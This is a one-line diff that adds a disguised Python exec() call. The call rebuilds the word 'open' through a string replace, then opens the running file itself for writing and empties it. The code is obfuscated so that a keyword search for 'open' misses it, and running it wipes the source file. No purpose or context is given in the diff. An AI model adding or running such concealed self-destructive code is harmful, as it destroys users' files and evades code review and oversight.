@@ -1,0 +1,1 @@
+exec('with o#n(__file__, "w") as f: f.write("")'.replace('#', 'pe'))
